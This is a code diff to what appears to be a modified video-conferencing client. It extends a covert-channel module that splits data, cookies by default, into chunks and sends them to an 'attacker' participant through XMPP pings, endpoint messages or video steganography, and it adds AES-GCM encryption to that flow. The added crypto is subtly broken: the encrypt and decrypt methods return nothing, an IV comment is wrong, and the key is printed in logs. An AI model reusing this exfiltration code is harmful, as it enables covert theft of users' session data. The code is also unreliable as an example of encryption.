@@ -10,7 +10,8 @@ import VideoSteganoEffect from './VideoSteganoEffect';
 export const defaultConfigurationValues = {
     method: 'plain',
     dataType: 'cookies',
-    chunkSize: 5000
+    chunkSize: 5000,
+    encryptionEnabled: true
 };
 
 /**
@@ -108,7 +109,11 @@ class CovertChannelMethods {
     static useXMPP(data) {
         const user = APP.conference.listMembers()[0].jid;
 
-        CovertChannelMethods.extractionPing(user, null, null, 1000, data);
+        CovertChannelMethods.extractionPing(user, () => {
+            console.log('success');
+        }, e => {
+            console.log('fail', e);
+        }, 1000, data);
 
         // APP.conference.saveLogs();
     }
@@ -174,7 +179,56 @@ export class ExtractionHandler {
         this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
         this._fileBuffer = [];
         this.communicationEnded = false;
+        this.initializeEncryption();
     }
+
+    /**
+     * Setting AES key and IV
+     */
+    async initializeEncryption() {
+        if (this.configuration.encryptionEnabled
+                && !this.configuration.key && !this.configuration.iv) {
+            this.configuration.key = await crypto.subtle.generateKey({ name: 'AES-GCM',
+                length: 128 }, true, [ 'encrypt', 'decrypt' ]);
+
+            // IV must be the same length (in bits) as the key
+            this.configuration.iv = crypto.getRandomValues(new Uint8Array(16));
+        }
+    }
+
+    /**
+     * Looks if encryption is used in the communication
+     * @returns {boolean}
+     */
+    enabledEncryption() {
+        return this.configuration.encryptionEnabled
+            && this.configuration.key instanceof CryptoKey
+            && this.configuration.iv instanceof Uint8Array;
+    }
+
+    /**
+     * Encrypts chunk of data
+     * @param {object} data
+     */
+    encrypt(data) {
+        crypto.subtle.encrypt({ name: 'AES-GCM',
+            tagLength: 32,
+            iv: this.configuration.iv }, this.configuration.key, new TextEncoder().encode(data))
+        .then(encryptedFile => encryptedFile);
+    }
+
+    /**
+     * Decrypts chunk of data
+     * @param {object} data
+     */
+    decrypt(data) {
+        crypto.subtle.decrypt({ name: 'AES-GCM',
+            tagLength: 32,
+            iv: this.configuration.iv }, this.configuration.key, data)
+        .then(decryptedData => new TextDecoder().decode(decryptedData));
+
+    }
+
 
     /**
      * getter for full file buffer
@@ -188,23 +242,37 @@ export class ExtractionHandler {
     }
 
     /**
+     * Send all chunks to the attacker
+     * @param {object} data To be sent
+     * @param {string} attackerId
+     */
+    sendChunks(data, attackerId) {
+        for (let chunkData of splitString(data, this.configuration.chunkSize)) {
+            // send data using corresponding method
+            if (this.enabledEncryption()) {
+                console.log('ENCRYPT:', chunkData, this);
+                chunkData = this.encrypt(chunkData);
+            }
+            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
+        }
+    }
+
+    /**
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
     sendAll(data, attackerId, dataSize = data.length) {
         // If the method can loose data through the transition send the final size of sent file.
-        if (this.configuration.method !== 'plain') {
-            CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
-        }
-        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
-            // send data using corresponding method
-            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
-        }
-        APP.conference.sendEndpointMessage(attackerId, {
-            extraction: 'reply',
-            isEnd: true
+
+        this.initializeEncryption().then(() => {
+            console.log('test:', JSON.parse(JSON.stringify(this)));
+            this.sendChunks(data, attackerId);
+            APP.conference.sendEndpointMessage(attackerId, {
+                extraction: 'reply',
+                isEnd: true
+            });
+            this.communicationEnded = true;
         });
-        this.communicationEnded = true;
     }
 
     /**
@@ -229,6 +297,9 @@ export class ExtractionHandler {
             this._fileBuffer = []; // empty the file buffer after ending communication.
             this.communicationEnded = true;
 
+        } else if (this.enabledEncryption()) { // 'reply' containg encrypted data
+            console.log('DECRYPT:', recievedData.payload, this);
+            this._fileBuffer.push(this.decrypt(recievedData.payload));
         } else { // 'reply' containg text data
             this._fileBuffer.push(recievedData.payload);
         }
